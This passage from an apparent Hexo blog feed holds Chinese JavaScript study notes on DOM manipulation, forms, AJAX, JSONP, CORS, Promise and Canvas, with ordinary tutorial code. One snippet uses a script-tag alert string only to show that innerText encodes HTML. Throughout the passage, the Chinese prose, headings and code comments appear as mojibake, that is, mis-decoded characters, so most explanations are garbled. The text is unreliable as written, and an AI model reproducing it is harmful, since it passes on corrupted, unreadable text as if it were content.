‡ç­¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å–&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p-id&#39;);</span><br><span class="line">&#x2F;&#x2F; è®¾ç½®æ–‡æœ¬:</span><br><span class="line">p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; HTMLè¢«è‡ªåŠ¨ç¼–ç ï¼Œæ— æ³•è®¾ç½®ä¸€ä¸ª&lt;script&gt;èŠ‚ç‚¹:</span><br><span class="line">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h3 id="æ’å…¥DOM"><a href="#æ’å…¥DOM" class="headerlink" title="æ’å…¥DOM"></a>æ’å…¥DOM</h3><p>ä¸€ä¸ªæ˜¯ä½¿ç”¨<code>appendChild</code>ï¼ŒæŠŠä¸€ä¸ªå­èŠ‚ç‚¹æ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹çš„æœ€åä¸€ä¸ªå­èŠ‚ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTMLç»“æ„ --&gt;</span><br><span class="line">&lt;p id=<span class="string">"js"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="list"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="java"&gt;Java&lt;/</span>p&gt;</span><br><span class="line">    &lt;p id=<span class="string">"python"</span>&gt;Python&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="scheme"&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var list = document.getElementById('list');</span></span><br><span class="line"><span class="regexp">js = document.createElement('p');</span></span><br><span class="line"><span class="regexp">js.id = 'js';</span></span><br><span class="line"><span class="regexp">js.innerText = 'javascript';</span></span><br><span class="line"><span class="regexp">list.appendChild(js);</span></span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªæ˜¯<code>insertBefore</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>parentElement.insertBefore(newElement, referenceElement);</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br><span class="line">    list = <span class="built_in">document</span>.getElementById(<span class="string">'list'</span>),</span><br><span class="line">    ref = <span class="built_in">document</span>.getElementById(<span class="string">'python'</span>),</span><br><span class="line">    haskell = <span class="built_in">document</span>.createElement(<span class="string">'p'</span>);</span><br><span class="line">haskell.id = <span class="string">'haskell'</span>;</span><br><span class="line">haskell.innerText = <span class="string">'Haskell'</span>;</span><br><span class="line">list.insertBefore(haskell, ref);</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤DOM"><a href="#åˆ é™¤DOM" class="headerlink" title="åˆ é™¤DOM"></a>åˆ é™¤DOM</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"parent"</span>&gt;</span><br><span class="line">    &lt;p&gt;First&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Second&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var parent = document.getElementById('parent');</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[0]);</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[1]); /</span><span class="regexp">/ &lt;-- æµè§ˆå™¨æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨æŠ¥é”™ï¼š<code>parent.children[1]</code>ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„èŠ‚ç‚¹ã€‚åŸå› å°±åœ¨äºï¼Œå½“<code>&lt;p&gt;First&lt;/p&gt;</code>èŠ‚ç‚¹è¢«åˆ é™¤åï¼Œ<code>parent.children</code>çš„èŠ‚ç‚¹æ•°é‡å·²ç»ä»2å˜ä¸ºäº†1ï¼Œç´¢å¼•<code>[1]</code>å·²ç»ä¸å­˜åœ¨äº†ã€‚</p><h2 id="æ“ä½œè¡¨å•"><a href="#æ“ä½œè¡¨å•" class="headerlink" title="æ“ä½œè¡¨å•"></a>æ“ä½œè¡¨å•</h2><p>HTMLè¡¨å•çš„è¾“å…¥æ§ä»¶ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>æ–‡æœ¬æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;text&quot;&gt;</code>ï¼Œç”¨äºè¾“å…¥æ–‡æœ¬ï¼›</li><li>å£ä»¤æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;password&quot;&gt;</code>ï¼Œç”¨äºè¾“å…¥å£ä»¤ï¼›</li><li>å•é€‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;radio&quot;&gt;</code>ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼›</li><li>å¤é€‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;checkbox&quot;&gt;</code>ï¼Œç”¨äºé€‰æ‹©å¤šé¡¹ï¼›</li><li>ä¸‹æ‹‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;select&gt;</code>ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼›</li><li>éšè—æ–‡æœ¬ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;hidden&quot;&gt;</code>ï¼Œç”¨æˆ·ä¸å¯è§ï¼Œä½†è¡¨å•æäº¤æ—¶ä¼šæŠŠéšè—æ–‡æœ¬å‘é€åˆ°æœåŠ¡å™¨ã€‚</li></ul><h3 id="è·å–å€¼"><a href="#è·å–å€¼" class="headerlink" title="è·å–å€¼"></a>è·å–å€¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value  &#x2F;&#x2F;ç”¨æˆ·è¾“å…¥çš„å€¼</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®å€¼"><a href="#è®¾ç½®å€¼" class="headerlink" title="è®¾ç½®å€¼"></a>è®¾ç½®å€¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value &#x3D; &#39;test&#39;;  &#x2F;&#x2F;æ–‡æœ¬æ¡†å†…å®¹å·²è¢«è®¾ç½®</span><br></pre></td></tr></table></figure><h3 id="HTML5æ§ä»¶"><a href="#HTML5æ§ä»¶" class="headerlink" title="HTML5æ§ä»¶"></a>HTML5æ§ä»¶</h3><p>HTML5æ–°å¢äº†å¤§é‡æ ‡å‡†æ§ä»¶ï¼Œå¸¸ç”¨çš„åŒ…æ‹¬<code>date</code>ã€<code>datetime</code>ã€<code>datetime-local</code>ã€<code>color</code>ç­‰ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨<code>&lt;input&gt;</code>æ ‡ç­¾ã€‚</p><h3 id="æäº¤è¡¨å•"><a href="#æäº¤è¡¨å•" class="headerlink" title="æäº¤è¡¨å•"></a>æäº¤è¡¨å•</h3><p>æ–¹å¼ä¸€æ˜¯é€šè¿‡<code>&lt;form&gt;</code>å…ƒç´ çš„<code>submit()</code>æ–¹æ³•æäº¤ä¸€ä¸ªè¡¨å•ï¼Œä¾‹å¦‚ï¼Œå“åº”ä¸€ä¸ª<code>&lt;button&gt;</code>çš„<code>click</code>äº‹ä»¶ï¼Œåœ¨JavaScriptä»£ç ä¸­æäº¤è¡¨å•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"button"</span> onclick=<span class="string">"doSubmitForm()"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span class="comment">// å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input...</span></span><br><span class="line">    <span class="comment">// æäº¤form:</span></span><br><span class="line">    form.submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹å¼æ˜¯å“åº”<code>&lt;form&gt;</code>æœ¬èº«çš„<code>onsubmit</code>äº‹ä»¶ï¼Œåœ¨æäº¤formæ—¶ä½œä¿®æ”¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span> onsubmit=<span class="string">"return checkForm()"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span class="comment">// å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input...</span></span><br><span class="line">    <span class="comment">// ç»§ç»­ä¸‹ä¸€æ­¥:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ“ä½œæ–‡ä»¶"><a href="#æ“ä½œæ–‡ä»¶" class="headerlink" title="æ“ä½œæ–‡ä»¶"></a>æ“ä½œæ–‡ä»¶</h2><p>åœ¨HTMLè¡¨å•ä¸­ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„å”¯ä¸€æ§ä»¶å°±æ˜¯<code>&lt;input type=&quot;file&quot;&gt;</code>ã€‚</p><p><em>æ³¨æ„</em>ï¼šå½“ä¸€ä¸ªè¡¨å•åŒ…å«<code>&lt;input type=&quot;file&quot;&gt;</code>æ—¶ï¼Œè¡¨å•çš„<code>enctype</code>å¿…é¡»æŒ‡å®šä¸º<code>multipart/form-data</code>ï¼Œ<code>method</code>å¿…é¡»æŒ‡å®šä¸º<code>post</code>ï¼Œæµè§ˆå™¨æ‰èƒ½æ­£ç¡®ç¼–ç å¹¶ä»¥<code>multipart/form-data</code>æ ¼å¼å‘é€è¡¨å•çš„æ•°æ®ã€‚</p><p>å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨åªå…è®¸ç”¨æˆ·ç‚¹å‡»<code>&lt;input type=&quot;file&quot;&gt;</code>æ¥é€‰æ‹©æœ¬åœ°æ–‡ä»¶ï¼Œç”¨JavaScriptå¯¹<code>&lt;input type=&quot;file&quot;&gt;</code>çš„<code>value</code>èµ‹å€¼æ˜¯æ²¡æœ‰ä»»ä½•æ•ˆæœçš„ã€‚å½“ç”¨æˆ·é€‰æ‹©äº†ä¸Šä¼ æŸä¸ªæ–‡ä»¶åï¼ŒJavaScriptä¹Ÿæ— æ³•è·å¾—è¯¥æ–‡ä»¶çš„çœŸå®è·¯å¾„ã€‚</p><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="*AJAX"></a>*AJAX</h2><p>å¦‚æœè¦è®©ç”¨æˆ·ç•™åœ¨å½“å‰é¡µé¢ä¸­ï¼ŒåŒæ—¶å‘å‡ºæ–°çš„HTTPè¯·æ±‚ï¼Œå°±å¿…é¡»ç”¨JavaScriptå‘é€è¿™ä¸ªæ–°è¯·æ±‚ï¼Œæ¥æ”¶åˆ°æ•°æ®åï¼Œå†ç”¨JavaScriptæ›´æ–°é¡µé¢ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç”¨æˆ·å°±æ„Ÿè§‰è‡ªå·±ä»ç„¶åœç•™åœ¨å½“å‰é¡µé¢ï¼Œä½†æ˜¯æ•°æ®å´å¯ä»¥ä¸æ–­åœ°æ›´æ–°ã€‚</p><p>ç”¨JavaScriptå†™ä¸€ä¸ªå®Œæ•´çš„AJAXä»£ç å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼š<strong>AJAXè¯·æ±‚æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦é€šè¿‡å›è°ƒå‡½æ•°è·å¾—å“åº”</strong>ã€‚</p><p>å½“åˆ›å»ºäº†<code>XMLHttpRequest</code>å¯¹è±¡åï¼Œè¦å…ˆè®¾ç½®<code>onreadystatechange</code>çš„å›è°ƒå‡½æ•°ã€‚åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œé€šå¸¸æˆ‘ä»¬åªéœ€é€šè¿‡<code>readyState === 4</code>åˆ¤æ–­è¯·æ±‚æ˜¯å¦å®Œæˆï¼Œå¦‚æœå·²å®Œæˆï¼Œå†æ ¹æ®<code>status === 200</code>åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæˆåŠŸçš„å“åº”ã€‚</p><p><code>XMLHttpRequest</code>å¯¹è±¡çš„<code>open()</code>æ–¹æ³•æœ‰3ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæ˜¯<code>GET</code>è¿˜æ˜¯<code>POST</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šURLåœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šæ˜¯å¦ä½¿ç”¨å¼‚æ­¥ï¼Œé»˜è®¤æ˜¯<code>true</code>ï¼Œæ‰€ä»¥ä¸ç”¨å†™ã€‚</p><p><em>æ³¨æ„</em>ï¼Œåƒä¸‡ä¸è¦æŠŠç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šä¸º<code>false</code>ï¼Œå¦åˆ™æµè§ˆå™¨å°†åœæ­¢å“åº”ï¼Œç›´åˆ°AJAXè¯·æ±‚å®Œæˆã€‚å¦‚æœè¿™ä¸ªè¯·æ±‚è€—æ—¶10ç§’ï¼Œé‚£ä¹ˆ10ç§’å†…ä½ ä¼šå‘ç°æµè§ˆå™¨å¤„äºâ€œå‡æ­»â€çŠ¶æ€ã€‚</p><p>æœ€åè°ƒç”¨<code>send()</code>æ–¹æ³•æ‰çœŸæ­£å‘é€è¯·æ±‚ã€‚<code>GET</code>è¯·æ±‚ä¸éœ€è¦å‚æ•°ï¼Œ<code>POST</code>è¯·æ±‚éœ€è¦æŠŠbodyéƒ¨åˆ†ä»¥å­—ç¬¦ä¸²æˆ–è€…<code>FormData</code>å¯¹è±¡ä¼ è¿›å»ã€‚</p><p><strong>å®‰å…¨é™åˆ¶</strong></p><p>ä¸Šé¢ä»£ç çš„URLä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœä½ æŠŠå®ƒæ”¹ä¸º<code>&#39;http://www.sina.com.cn/&#39;</code>ï¼Œå†è¿è¡Œï¼Œè‚¯å®šæŠ¥é”™ã€‚åœ¨Chromeçš„æ§åˆ¶å°é‡Œï¼Œè¿˜å¯ä»¥çœ‹åˆ°é”™è¯¯ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>JavaScriptåœ¨å‘é€AJAXè¯·æ±‚æ—¶ï¼ŒURLçš„åŸŸåå¿…é¡»å’Œå½“å‰é¡µé¢å®Œå…¨ä¸€è‡´ã€‚å®Œå…¨ä¸€è‡´çš„æ„æ€æ˜¯ï¼ŒåŸŸåè¦ç›¸åŒï¼ˆ<code>www.example.com</code>å’Œ<code>example.com</code>ä¸åŒï¼‰ï¼Œåè®®è¦ç›¸åŒï¼ˆ<code>http</code>å’Œ<code>https</code>ä¸åŒï¼‰ï¼Œç«¯å£å·è¦ç›¸åŒï¼ˆé»˜è®¤æ˜¯<code>:80</code>ç«¯å£ï¼Œå®ƒå’Œ<code>:8080</code>å°±ä¸åŒï¼‰ã€‚</strong>æœ‰çš„æµè§ˆå™¨å£å­æ¾ä¸€ç‚¹ï¼Œå…è®¸ç«¯å£ä¸åŒï¼Œå¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šä¸¥æ ¼éµå®ˆè¿™ä¸ªé™åˆ¶ã€‚</p><p>JSè¯·æ±‚å¤–åŸŸçš„URLï¼š</p><p>ä¸€æ˜¯é€šè¿‡Flashæ’ä»¶å‘é€HTTPè¯·æ±‚ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç»•è¿‡æµè§ˆå™¨çš„å®‰å…¨é™åˆ¶ï¼Œä½†å¿…é¡»å®‰è£…Flashï¼Œå¹¶ä¸”è·ŸFlashäº¤äº’ã€‚ä¸è¿‡Flashç”¨èµ·æ¥éº»çƒ¦ï¼Œè€Œä¸”ç°åœ¨ç”¨å¾—ä¹Ÿè¶Šæ¥è¶Šå°‘äº†ã€‚</p><p>äºŒæ˜¯é€šè¿‡åœ¨åŒæºåŸŸåä¸‹æ¶è®¾ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ¥è½¬å‘ï¼ŒJavaScriptè´Ÿè´£æŠŠè¯·æ±‚å‘é€åˆ°ä»£ç†æœåŠ¡å™¨ï¼šä»£ç†æœåŠ¡å™¨å†æŠŠç»“æœè¿”å›ï¼Œè¿™æ ·å°±éµå®ˆäº†æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚è¿™ç§æ–¹å¼éº»çƒ¦ä¹‹å¤„åœ¨äºéœ€è¦æœåŠ¡å™¨ç«¯é¢å¤–åšå¼€å‘ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹å¼ç§°ä¸ºJSONPï¼Œå®ƒæœ‰ä¸ªé™åˆ¶ï¼Œåªèƒ½ç”¨GETè¯·æ±‚ï¼Œå¹¶ä¸”è¦æ±‚è¿”å›JavaScriptã€‚è¿™ç§æ–¹å¼è·¨åŸŸå®é™…ä¸Šæ˜¯åˆ©ç”¨äº†æµè§ˆå™¨å…è®¸è·¨åŸŸå¼•ç”¨JavaScriptèµ„æºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>JSONPé€šå¸¸ä»¥å‡½æ•°è°ƒç”¨çš„å½¢å¼è¿”å›ï¼Œä¾‹å¦‚ï¼Œè¿”å›JavaScriptå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo(&#39;data&#39;);</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å¦‚æœåœ¨é¡µé¢ä¸­å…ˆå‡†å¤‡å¥½<code>foo()</code>å‡½æ•°ï¼Œç„¶åç»™é¡µé¢åŠ¨æ€åŠ ä¸€ä¸ª<code>&lt;script&gt;</code>èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€è¯»å–å¤–åŸŸçš„JavaScriptèµ„æºï¼Œæœ€åå°±ç­‰ç€æ¥æ”¶å›è°ƒäº†ã€‚</p><p>ä»¥163çš„è‚¡ç¥¨æŸ¥è¯¢URLä¸ºä¾‹ï¼Œå¯¹äºURLï¼š<a href="http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPriceï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹è¿”å›ï¼š" target="_blank" rel="noopener">http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPriceï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹è¿”å›ï¼š</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;);</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦é¦–å…ˆåœ¨é¡µé¢ä¸­å‡†å¤‡å¥½å›è°ƒå‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function refreshPrice(data) &#123;</span><br><span class="line">    var p &#x3D; document.getElementById(&#39;test-jsonp&#39;);</span><br><span class="line">    p.innerHTML &#x3D; &#39;å½“å‰ä»·æ ¼ï¼š&#39; +</span><br><span class="line">        data[&#39;0000001&#39;].name +&#39;: &#39; + </span><br><span class="line">        data[&#39;0000001&#39;].price + &#39;ï¼›&#39; +</span><br><span class="line">        data[&#39;1399001&#39;].name + &#39;: &#39; +</span><br><span class="line">        data[&#39;1399001&#39;].price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“å‰ä»·æ ¼ï¼šä¸Šè¯æŒ‡æ•°: 3310.01ï¼›æ·±è¯æˆæŒ‡: 13637.883</p><p>åˆ·æ–°</p><p>æœ€åç”¨<code>getPrice()</code>å‡½æ•°è§¦å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function getPrice() &#123;</span><br><span class="line">    var</span><br><span class="line">        js &#x3D; document.createElement(&#39;script&#39;),</span><br><span class="line">        head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class="line">    js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;;</span><br><span class="line">    head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±å®Œæˆäº†è·¨åŸŸåŠ è½½æ•°æ®ã€‚</p><p><strong>CORS</strong></p><p>CORSå…¨ç§°Cross-Origin Resource Sharing</p><p>æœ¬åŸŸï¼šOriginï¼Œä¹Ÿå°±æ˜¯æµè§ˆå™¨å½“å‰é¡µé¢çš„åŸŸã€‚</p><p>å¤–åŸŸï¼šæŒ‡å‘çš„è®¿é—®ç½‘é¡µ</p><p>å½“JavaScriptå‘å¤–åŸŸå‘èµ·è¯·æ±‚åï¼Œæµè§ˆå™¨æ”¶åˆ°å“åº”åï¼Œé¦–å…ˆæ£€æŸ¥<code>Access-Control-Allow-Origin</code>æ˜¯å¦åŒ…å«æœ¬åŸŸï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ­¤æ¬¡è·¨åŸŸè¯·æ±‚æˆåŠŸï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¯·æ±‚å¤±è´¥ï¼ŒJavaScriptå°†æ— æ³•è·å–åˆ°å“åº”çš„ä»»ä½•æ•°æ®ã€‚</p><p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801154253687.png" alt="image-20200801154253687"></p><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>Promiseå¯¹è±¡å…ˆç»Ÿä¸€æ‰§è¡ŒAJAXé€»è¾‘ï¼Œä¸å…³å¿ƒå¦‚ä½•å¤„ç†ç»“æœï¼Œç„¶åï¼Œæ ¹æ®ç»“æœæ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œåœ¨å°†æ¥çš„æŸä¸ªæ—¶å€™è°ƒç”¨<code>success</code>å‡½æ•°æˆ–<code>fail</code>å‡½æ•°ã€‚</p><p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801155554430.png" alt="image-20200801155554430"></p><p><strong>å¯¹Promiseå’ŒAJAXç†è§£è¿˜ä¸æ˜¯å¾ˆæ·±åˆ»ï¼Œå›å¤´ç»§ç»­çœ‹ã€‚</strong></p><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>Canvasæ˜¯HTML5æ–°å¢çš„ç»„ä»¶ï¼Œå®ƒå°±åƒä¸€å—å¹•å¸ƒï¼Œå¯ä»¥ç”¨JavaScriptåœ¨ä¸Šé¢ç»˜åˆ¶å„ç§å›¾è¡¨ã€åŠ¨ç”»ç­‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTMLä»£ç  --&gt;</span><br><span class="line">&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt;</span><br><span class="line">    &lt;p&gt;ä½ çš„æµè§ˆå™¨ä¸æ”¯æŒCanvas&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;canvas&gt;</span><br></pre></td></tr></table></figure><hr><p><strong>åé¢çš„jQueryï¼ŒNode.jså’ŒReactä¹‹åå†çœ‹ã€‚</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;Javascript&quot;&gt;&lt;a href=&quot;#Javascript&quot; class=&quot;headerlink&quot; title=&quot;Javascript&quot;&gt;&lt;/a&gt;Javascript&lt;/h1&gt;&lt;p&gt;å‚è€ƒå»–é›ªå³°æ•™ç¨‹&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="å‰ç«¯" scheme="https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="å‰ç«¯" scheme="https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="å­¦ä¹ " scheme="https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
